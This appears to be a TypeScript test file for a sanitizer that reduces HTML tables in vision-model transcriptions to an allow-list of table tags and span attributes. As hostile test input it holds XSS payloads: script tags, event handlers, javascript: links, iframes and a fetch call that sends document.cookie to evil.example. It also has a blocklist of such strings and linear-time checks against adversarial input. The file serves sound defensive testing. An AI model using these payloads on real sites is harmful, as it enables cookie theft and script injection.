import { describe, expect, it } from "vitest";

import {
  MAX_SANITIZE_CHARS,
  MAX_TABLE_CELLS,
  MAX_TABLE_ROWS,
  MAX_TABLE_SPAN,
  sanitizeVisionHtmlTables,
} from "../tools/vision-html-tables.js";
import {
  MARKDOWN_LATEX_VISION_PROMPT,
  MARKDOWN_TRANSCRIPTION_VISION_PROMPT,
  PAGE_MARKDOWN_LATEX_VISION_PROMPT,
  postProcessVisionText,
} from "../tools/vision-model-profiles.js";

/** Every tag left in the output, by name, so a test can assert the allow-list. */
const tagNames = (html: string) => [...html.matchAll(/<\/?([a-z][a-z0-9-]*)/gi)].map((m) => m[1]!.toLowerCase());
const attributes = (html: string) => [...html.matchAll(/<[a-z]+\s+([^>]*)>/gi)].flatMap((m) => [...m[1]!.matchAll(/([a-z-]+)=/gi)].map((a) => a[1]!.toLowerCase()));
const ALLOWED = new Set(["table", "thead", "tbody", "tr", "th", "td"]);

function expectAllowListed(html: string) {
  for (const name of tagNames(html)) expect(ALLOWED.has(name), `tag ${name}`).toBe(true);
  for (const name of attributes(html)) expect(["rowspan", "colspan"]).toContain(name);
}

describe("vision HTML tables: strict allow-list", () => {
  it("keeps a multi-level header with rowspan and colspan, in canonical form", () => {
    const model = [
      "## Quarterly results",
      "",
      "<table>",
      "  <thead>",
      '    <tr><th rowspan="2">Region</th><th colspan="2">Revenue</th></tr>',
      "    <tr><th>2025</th><th>2026</th></tr>",
      "  </thead>",
      "  <tbody>",
      "    <tr><td>North</td><td>412.5</td><td>498.1</td></tr>",
      "  </tbody>",
      "</table>",
      "",
      "Growth beat the plan.",
    ].join("\n");
    expect(sanitizeVisionHtmlTables(model)).toBe([
      "## Quarterly results",
      "",
      "<table>",
      "<thead>",
      '<tr><th rowspan="2">Region</th><th colspan="2">Revenue</th></tr>',
      "<tr><th>2025</th><th>2026</th></tr>",
      "</thead>",
      "<tbody>",
      "<tr><td>North</td><td>412.5</td><td>498.1</td></tr>",
      "</tbody>",
      "</table>",
      "",
      "Growth beat the plan.",
    ].join("\n"));
  });

  it("leaves output without table markup untouched (pipe tables, prose, other inline HTML)", () => {
    const markdown = "| a | b |\n| --- | --- |\n| 1 | 2 |\n\nx<sup>2</sup> and a < b > c";
    expect(sanitizeVisionHtmlTables(markdown)).toBe(markdown);
  });

  it("drops scripts, styles and event handlers; never copies an attribute", () => {
    const hostile = [
      '<table onload="alert(1)" style="x"><tr>',
      '<td onclick="steal()" colspan="2" class="c" data-x="1">Bookings<script>fetch("https://evil.example/"+document.cookie)</script></td>',
      '<td><img src=x onerror=alert(1)>Expansion</td>',
      '<td><a href="javascript:alert(1)">Launch</a></td>',
      "<td><style>body{display:none}</style>Paris</td>",
      '<td><iframe src="https://evil.example"></iframe>London</td>',
      "</tr></table>",
    ].join("");
    const out = sanitizeVisionHtmlTables(hostile);
    expectAllowListed(out);
    expect(out).toBe('<table>\n<tbody>\n<tr><td colspan="2">Bookings</td><td>Expansion</td><td>Launch</td><td>Paris</td><td>London</td></tr>\n</tbody>\n</table>');
    for (const bad of ["script", "onclick", "onerror", "onload", "javascript:", "evil.example", "style", "cookie"]) expect(out).not.toContain(bad);
  });

  it("escapes text: entities decode once and markup-looking text stays text", () => {
    const out = sanitizeVisionHtmlTables('<table><tr><td>&lt;script&gt;alert(1)&lt;/script&gt;</td><td>R&amp;D &quot;Q1&quot;</td><td>a < b</td><td>&#60;img src=x onerror=alert(1)&#62;</td></tr></table>');
    expectAllowListed(out);
    expect(out).toContain("<td>&lt;script&gt;alert(1)&lt;/script&gt;</td>");
    expect(out).toContain("<td>R&amp;D &quot;Q1&quot;</td>");
    expect(out).toContain("<td>a &lt; b</td>");
    expect(out).toContain("<td>&lt;img src=x onerror=alert(1)&gt;</td>");
  });

  it("flattens a nested table into its cell and keeps one table", () => {
    const out = sanitizeVisionHtmlTables("<table><tr><td>Outer<table><tr><td>inner A</td><td>inner B</td></tr></table></td><td>Next</td></tr></table>");
    expectAllowListed(out);
    expect(tagNames(out).filter((t) => t === "table")).toHaveLength(2); // one open, one close
    expect(out).toContain("<td>Outer inner A inner B</td><td>Next</td>");
  });

  it("bounds spans: huge, zero, negative, fractional, exponent and padded values become 1; spans are cut to the table", () => {
    const cells = ["99999", "0", "-3", "2.5", "1e3", "0x10", "007", " 2 ", "abc", String(MAX_TABLE_SPAN + 1)]
      .map((v) => `<td colspan="${v}" rowspan="${v}">c</td>`).join("");
    const out = sanitizeVisionHtmlTables(`<table><tr>${cells}</tr></table>`);
    expectAllowListed(out);
    // Only " 2 " is a plain integer in range (as a colspan; as a rowspan it is cut to the one row left).
    expect(out.match(/span="/g)).toHaveLength(1);
    expect(out).toContain('<td colspan="2">c</td>');
    const tall = sanitizeVisionHtmlTables(`<table><tr><td rowspan="${MAX_TABLE_SPAN}">a</td><td>b</td></tr><tr><td>c</td></tr></table>`);
    expect(tall).toContain('<td rowspan="2">a</td>');
    const wide = sanitizeVisionHtmlTables(`<table><tr>${'<td colspan="60">x</td>'.repeat(3)}</tr></table>`);
    expect(wide).toContain('<td colspan="60">x</td><td colspan="40">x</td><td>x</td>');
  });

  it("an unclosed table ends at the end of the output; stray table tags outside a table are escaped", () => {
    const out = sanitizeVisionHtmlTables("Intro\n\n<table><tr><td>Revenue</td><td>12");
    expect(out).toBe("Intro\n\n<table>\n<tbody>\n<tr><td>Revenue</td><td>12</td></tr>\n</tbody>\n</table>");
    expect(sanitizeVisionHtmlTables("Done</table> then <tr><td>x</td></tr>")).toBe("Done&lt;/table> then &lt;tr>&lt;td>x&lt;/td>&lt;/tr>");
    expect(sanitizeVisionHtmlTables("<tablet>not a table</tablet>")).toBe("<tablet>not a table</tablet>");
  });

  it("text outside cells is kept after the table, never as markup", () => {
    const out = sanitizeVisionHtmlTables('<table><caption>Bookings <b>2026</b></caption><tr>loose <i>text</i><td>a</td></tr></table>');
    expectAllowListed(out);
    expect(out).toBe("<table>\n<tbody>\n<tr><td>a</td></tr>\n</tbody>\n</table>\n\nBookings 2026 loose text");
  });

  it("comments, doctype and processing instructions are dropped; an empty table leaves nothing", () => {
    expect(sanitizeVisionHtmlTables("<table><!-- <script>x</script> --><!DOCTYPE html><?xml x?><tr><td>a</td></tr></table>"))
      .toBe("<table>\n<tbody>\n<tr><td>a</td></tr>\n</tbody>\n</table>");
    expect(sanitizeVisionHtmlTables("a\n\n<table><tr></tr></table>\n\nb")).toBe("a\n\n\n\nb");
  });

  it("caps rows and cells; text past the caps follows the table", () => {
    const rows = "<tr><td>r</td></tr>".repeat(MAX_TABLE_ROWS + 5);
    const out = sanitizeVisionHtmlTables(`<table>${rows}</table>`);
    expect(out.match(/<tr>/g)).toHaveLength(MAX_TABLE_ROWS);
    const cells = sanitizeVisionHtmlTables(`<table><tr>${"<td>c</td>".repeat(MAX_TABLE_CELLS + 3)}</tr></table>`);
    expect(cells.match(/<td>/g)).toHaveLength(MAX_TABLE_CELLS);
  });

  it("is linear on hostile output", () => {
    const elapsed = (fn: () => unknown) => { const start = performance.now(); fn(); return performance.now() - start; };
    const n = MAX_SANITIZE_CHARS - 64;
    for (const text of [
      `<table>${"<a".repeat(n / 2)}`,
      `<table>${"<td".repeat(n / 3)}`,
      `<table>${"<script>".repeat(n / 8)}`,
      `<table><tr><td ${"rowspan ".repeat(n / 8)}>x</td></tr></table>`,
      "<table>".repeat(n / 7),
      `${"<table><tr><td>x</td></tr></table>\n".repeat(n / 35)}`,
      `<table>${"<!--".repeat(n / 4)}`,
      `<table>${"&#x1F600;".repeat(n / 9)}`,
    ]) {
      expect(elapsed(() => sanitizeVisionHtmlTables(text))).toBeLessThan(2_000);
    }
    // Over the cap, table tags are only escaped.
    const big = `<table><tr><td>x</td></tr></table>${"y".repeat(MAX_SANITIZE_CHARS)}`;
    expect(sanitizeVisionHtmlTables(big).startsWith("&lt;table>&lt;tr>&lt;td>x&lt;/td>")).toBe(true);
  });
});

describe("vision prompts and post-processing", () => {
  it("every transcription template asks for HTML spans on merged-cell tables and keeps pipe tables for simple ones", () => {
    for (const prompt of [MARKDOWN_LATEX_VISION_PROMPT, MARKDOWN_TRANSCRIPTION_VISION_PROMPT, PAGE_MARKDOWN_LATEX_VISION_PROMPT]) {
      expect(prompt).toContain("GFM pipe tables");
      expect(prompt).toContain("rowspan or colspan");
      expect(prompt).toContain("use no other tags or attributes");
    }
  });

  it("postProcessVisionText sanitizes tables for every model, after the profile repair", () => {
    const hostile = '```markdown\n<table><tr><td onclick="x()">A<script>bad()</script></td></tr></table>\n```';
    for (const model of ["openai/gpt-6-luna", "deepseek/deepseek-v4.1-flash-1017", "unknown/model", undefined]) {
      const out = postProcessVisionText(model, hostile);
      expect(out).not.toContain("onclick");
      expect(out).not.toContain("script");
    }
    expect(postProcessVisionText("openai/gpt-6-luna", hostile)).toBe("<table>\n<tbody>\n<tr><td>A</td></tr>\n</tbody>\n</table>");
  });
});
